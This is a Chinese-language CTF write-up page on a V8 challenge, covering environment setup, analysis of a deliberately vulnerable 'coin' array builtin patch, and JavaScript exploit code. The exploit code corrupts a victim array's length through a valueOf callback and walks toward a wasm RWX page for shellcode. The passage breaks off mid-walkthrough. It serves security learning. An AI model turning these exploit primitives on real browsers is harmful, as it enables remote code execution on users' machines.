@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="browser,v8," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="数字经济线下-Browser这题是数字经济线下赛的一道RealWorld pwn，很久以前就想调来着，一直拖到了现在，期间遇到了一个困扰了很久的问题，可惜后来还是没有解决。最后是看了别的师傅采用的方法来做的，这里记录一下~ 下载地址 环境搭建在开始分析题目之前得先把环境搭起来，这题没有给出v8的版本，给出的是chromium的commitid，所以我是先把chromium下载下来，然后切换到了题目">
+<meta name="keywords" content="browser,v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数字经济线下-Browser">
+<meta property="og:url" content="https://e3pem.github.io/2019/11/20/browser/数字经济线下-Browser/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="数字经济线下-Browser这题是数字经济线下赛的一道RealWorld pwn，很久以前就想调来着，一直拖到了现在，期间遇到了一个困扰了很久的问题，可惜后来还是没有解决。最后是看了别的师傅采用的方法来做的，这里记录一下~ 下载地址 环境搭建在开始分析题目之前得先把环境搭起来，这题没有给出v8的版本，给出的是chromium的commitid，所以我是先把chromium下载下来，然后切换到了题目">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191024233640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191120114328.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191120152118.png">
+<meta property="og:updated_time" content="2019-11-20T07:48:40.706Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="数字经济线下-Browser">
+<meta name="twitter:description" content="数字经济线下-Browser这题是数字经济线下赛的一道RealWorld pwn，很久以前就想调来着，一直拖到了现在，期间遇到了一个困扰了很久的问题，可惜后来还是没有解决。最后是看了别的师傅采用的方法来做的，这里记录一下~ 下载地址 环境搭建在开始分析题目之前得先把环境搭起来，这题没有给出v8的版本，给出的是chromium的commitid，所以我是先把chromium下载下来，然后切换到了题目">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191024233640.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e3pem.github.io/2019/11/20/browser/数字经济线下-Browser/"/>
+
+
+
+
+
+  <title>数字经济线下-Browser | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2019/11/20/browser/数字经济线下-Browser/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">数字经济线下-Browser</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-20T12:00:00+08:00">
+                2019-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="数字经济线下-Browser"><a href="#数字经济线下-Browser" class="headerlink" title="数字经济线下-Browser"></a>数字经济线下-Browser</h2><p>这题是数字经济线下赛的一道RealWorld pwn，很久以前就想调来着，一直拖到了现在，期间遇到了一个困扰了很久的问题，可惜后来还是没有解决。最后是看了别的师傅采用的方法来做的，这里记录一下~</p>
+<p><a href="https://github.com/e3pem/CTF/tree/master/shuzijingji" target="_blank" rel="noopener">下载地址</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在开始分析题目之前得先把环境搭起来，这题没有给出v8的版本，给出的是chromium的commitid，所以我是先把chromium下载下来，然后切换到了题目中给出的f3ee5ef941cb，在该版本下进入到chromium的v8目录下，通过<code>git log</code>来获取当前版本的v8的commitid，获取到的id为<code>0ec93e0472169794</code>。然后按照获取v8并编译出来d8的流程即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该版本的chromium对应的v8的id</span></span><br><span class="line">git checkout 0ec93e047216979431bd6f147ab5956bb729afa2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译debug版本的d8</span></span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译release版本的包含漏洞的d8</span></span><br><span class="line">git apply --ignore-space-change --ignore-whitespace ../diff.patch</span><br><span class="line">tools/dev/v8gen.py x64.release </span><br><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>分析题目给出的diff文件，可以发现和starctf里面的OOB很类似，这题是给数组新增了一个coin函数，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line">+// Vulnerability is here</span><br><span class="line">+// You can&apos;t use this vulnerability in Debug Build :)</span><br><span class="line">+BUILTIN(ArrayCoin) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if (len != 3) &#123;</span><br><span class="line">+     return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; value;</span><br><span class="line">+  Handle&lt;Object&gt; length;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span><br><span class="line">+</span><br><span class="line">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+  if(37 &lt; array_length)&#123;</span><br><span class="line">+    elements.set(37, value-&gt;Number());</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();  </span><br><span class="line">+  &#125;</span><br><span class="line">+  else&#123;</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   Handle&lt;Object&gt; receiver = args.receiver();</span><br></pre></td></tr></table></figure></p>
+<p>首先判断参数的个数是否为3，除去默认的第0个参数，coin函数中应该需要两个参数。然后将数组的elements保存到<strong>局部变量</strong>中，接着获取用户输入的第1个参数作为length，第2个参数作为value。最后判断数组的长度是否<strong>大于37</strong>，是则利用保存在局部变量中的elemets将其第37个元素设置为value的值。</p>
+<p>乍一看程序好像没有任何问题，在赋值之前也有判断数组的长度是否大于37，所以对elemets的元素进行赋值的时候应该都是对数组中的元素进行赋值才对！问题就出在<code>Object::ToNumber()</code>这个函数中，该函数可以通过valueOf触发callback回调，在回调函数中重新设置数组的length，就可以让数组重新分配elements的内存空间。</p>
+<p>这会产生什么问题呢？试想如果最开始让数组的长度小于37，回调函数中将其设置为一个大于37的值，这样在判断数组长度的时候是满足大于37这个条件的，但是其中的set操作是对保存在局部变量中的elements进行操作的。由于数组重新分配了elements的空间，所以保存在局部变量中的elements相当于一个已经释放了的指针，对该指针指向的element的第37个元素进行set操作，便是越界写数据！</p>
+<h2 id="Object-ToNumber的分析"><a href="#Object-ToNumber的分析" class="headerlink" title="Object::ToNumber的分析"></a>Object::ToNumber的分析</h2><p>前面提到漏洞的关键在于<code>Object::ToNumber</code>能触发回调函数，下面从源码的角度来大致分析它是在什么地方触发回调函数的，由于没看过v8的源码，所以这里也只是大致的翻一下源码，如果有错的地方还请大佬们指正。</p>
+<p>在vscode中全局搜索<code>Object::ToNumber</code>，找到之后用<code>Go to Definition</code>找到其定义的地方，该函数判断input是否是Number，是则将input返回，否则调用<code>ConvertToNumberOrNumeric</code>函数</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">MaybeHandle&lt;Object&gt; Object::ToNumber(Isolate* isolate, Handle&lt;Object&gt; input) &#123;</span><br><span class="line">  <span class="keyword">if</span> (input-&gt;IsNumber()) <span class="keyword">return</span> input;  <span class="comment">// Shortcut.</span></span><br><span class="line">  <span class="keyword">return</span> ConvertToNumberOrNumeric(isolate, input, Conversion::kToNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>ConvertToNumberOrNumeric</code>，该函数是一个while循环，依次判断input是否属于Number、String、Oddball、Symbol以及BigInt。如果是则调用对应类的ToNumber函数，都不是则调用最后的<code>JSReceiver::ToPrimitive</code>函数，经过<code>JSReceiver::ToPrimitive</code>函数处理的结果将保存到input中，经while循环再次判断input是否是Number、String等。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">MaybeHandle&lt;Object&gt; Object::ConvertToNumberOrNumeric(Isolate* isolate,</span><br><span class="line">                                                     Handle&lt;Object&gt; input,</span><br><span class="line">                                                     Conversion mode) &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="comment">// 判断是否是常见的Number、String等</span></span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsNumber()) &#123;</span><br><span class="line">      <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsString()) &#123;</span><br><span class="line">      <span class="keyword">return</span> String::ToNumber(isolate, Handle&lt;String&gt;::cast(input));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsOddball()) &#123;</span><br><span class="line">      <span class="keyword">return</span> Oddball::ToNumber(isolate, Handle&lt;Oddball&gt;::cast(input));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsSymbol()) &#123;</span><br><span class="line">      THROW_NEW_ERROR(isolate, NewTypeError(MessageTemplate::kSymbolToNumber),</span><br><span class="line">                      Object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input-&gt;IsBigInt()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (mode == Conversion::kToNumeric) <span class="keyword">return</span> input;</span><br><span class="line">      DCHECK_EQ(mode, Conversion::kToNumber);</span><br><span class="line">      THROW_NEW_ERROR(isolate, NewTypeError(MessageTemplate::kBigIntToNumber),</span><br><span class="line">                      Object);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 调用该函数尝试将input转换为更原始的值，然后进入新一轮的循环对新的input进行判断</span></span><br><span class="line">    ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">        isolate, input,</span><br><span class="line">        JSReceiver::ToPrimitive(Handle&lt;JSReceiver&gt;::cast(input),</span><br><span class="line">                                ToPrimitiveHint::kNumber),</span><br><span class="line">        Object);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>JSReceiver::ToPrimitive</code>，会发现这个函数中出现了我们所期望的内容。通过<code>Object::GetMethod</code>从参数receiver中获取一个函数，如果跟进<code>Object::GetMethod</code>也会发现它调用了<code>JSReceiver::GetProperty</code>从receiver中获取属性信息，判断其是否是可以调用的函数<code>isCallable()</code>，并将其返回。最后会用<code>Execution::Call</code>来调用获取到的函数，这应该就是前面提到的调用回调函数的地方了！</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">MaybeHandle&lt;Object&gt; JSReceiver::ToPrimitive(Handle&lt;JSReceiver&gt; receiver,</span><br><span class="line">                                            ToPrimitiveHint hint) &#123;</span><br><span class="line">  Isolate* <span class="keyword">const</span> isolate = receiver-&gt;GetIsolate();</span><br><span class="line">  Handle&lt;Object&gt; exotic_to_prim;</span><br><span class="line">  <span class="comment">//获取receiver中的Method，保存到exotic_to_prim</span></span><br><span class="line">  ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">      isolate, exotic_to_prim,</span><br><span class="line">      Object::GetMethod(receiver, isolate-&gt;factory()-&gt;to_primitive_symbol()),</span><br><span class="line">      Object);</span><br><span class="line">	<span class="comment">// 如果不是Undefined</span></span><br><span class="line">  <span class="keyword">if</span> (!exotic_to_prim-&gt;IsUndefined(isolate)) &#123;</span><br><span class="line">    Handle&lt;Object&gt; hint_string =</span><br><span class="line">        isolate-&gt;factory()-&gt;ToPrimitiveHintString(hint);</span><br><span class="line">    Handle&lt;Object&gt; result;</span><br><span class="line">	<span class="comment">// 调用获取到的Method，结果保存至result</span></span><br><span class="line">    ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">        isolate, result,</span><br><span class="line">        Execution::Call(isolate, exotic_to_prim, receiver, <span class="number">1</span>, &amp;hint_string),</span><br><span class="line">        Object);</span><br><span class="line">	<span class="comment">// 返回result</span></span><br><span class="line">    <span class="keyword">if</span> (result-&gt;IsPrimitive()) <span class="keyword">return</span> result;</span><br><span class="line">    THROW_NEW_ERROR(isolate,</span><br><span class="line">                    NewTypeError(MessageTemplate::kCannotConvertToPrimitive),</span><br><span class="line">                    Object);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> OrdinaryToPrimitive(receiver, (hint == ToPrimitiveHint::kString)</span><br><span class="line">                                           ? OrdinaryToPrimitiveHint::kString</span><br><span class="line">                                           : OrdinaryToPrimitiveHint::kNumber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用-1"></a>漏洞利用-1</h2><p>经过前面的分析，知道可以在ToNumber的回调中增加数组的长度来让其重新分配空间造成一个UAF，如果数组开始的长度小于37的话将会发生越界写。如果越界写的刚好是另一个数组的长度字段，那就有一个很大的数组越界了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> length = &#123;</span><br><span class="line">	valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">20000000000000</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;;   </span><br><span class="line"><span class="keyword">var</span> val= &#123;</span><br><span class="line">	<span class="comment">// 回调函数，新申请一个数组，并重新设置数组长度为0x100</span></span><br><span class="line">	valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		victim=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">12</span>).fill(<span class="number">1.1</span>)</span><br><span class="line">		array.length = <span class="number">0x100</span></span><br><span class="line">		<span class="keyword">return</span>  <span class="number">999999999999999</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> array=[];</span><br><span class="line">array.length=<span class="number">34</span>;</span><br><span class="line"><span class="comment">// 会将victim的数组长度覆盖为一个很大的值</span></span><br><span class="line">array.coin(length,val);</span><br></pre></td></tr></table></figure></p>
+<p>有了数组的越界，按照OOB的利用思路，实现addressOf，通过修改ArrayBuffer的backingstore实现任意地址读写。然后查找wasm的rwx段所在地址，写入shellcode应该就可以实现利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f addr: 0x"</span>+hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr+<span class="number">0x18</span>n)<span class="number">-0x1</span>n;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function = read64(shared_info_addr+<span class="number">8</span>n)<span class="number">-1</span>n;</span><br><span class="line"><span class="keyword">var</span> instance_addr = read64(wasm_exported_function+<span class="number">0x10</span>n)<span class="number">-1</span>n;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(instance_addr+<span class="number">0x88</span>n);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx page addr: 0x"</span>+hex(rwx_page_addr));</span><br></pre></td></tr></table></figure></p>
+<p>但是在这个过程中遇到了一个问题，就是在查找rwx段地址的时候需要多次任意地址读，当我在第二次读的时候便会触发如下所示的错误：</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191024233640.png" alt=""></p>
+<p>一开始以为是我构造的利用有问题，但是尝试了几次之后发现并没有得到解决，也尝试过换一套模板，但只要是第二次任意地址读就会导致异常。后来又怀疑是因为JIT优化导致的问题，对同一个ArrayBuffer的backingstore写两次会触发异常，那么对不同的ArrayBuffer写会不会解决这个问题呢？我构造了多个ArrayBuffer，每次写的都是不同的ArrayBuffer，但还是一样的问题！</p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用-2"></a>漏洞利用-2</h2><p>后来看了别的师傅的文章，看到了另外一种利用方式，发现没有出现上面遇到的问题。这个方法的本质是在内存中搜索rwx的地址，大致过程如下：</p>
+<p>首先构造如下的对象：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">51</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">105</span>, <span class="number">105</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.exports._Z3addii;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vicobj=&#123;<span class="attr">marker</span>: <span class="number">1111222233334444</span>, <span class="attr">obj</span>: f&#125;</span><br><span class="line">%DebugPrint(vicobj);</span><br><span class="line">readline();</span><br></pre></td></tr></table></figure></p>
+<p>调试可以得知f的地址：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vicobj的地址</span></span><br><span class="line">0x2784f3b0f2e1 &lt;Object map = 0x158696e8a909&gt;</span><br><span class="line"><span class="comment"># f的地址</span></span><br><span class="line">0x231280aa1249 &lt;JSFunction 0 (sfi = 0x231280aa1211)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20191120114328.png" alt=""></p>
+<p>此时rwx段所在地址为：</p>
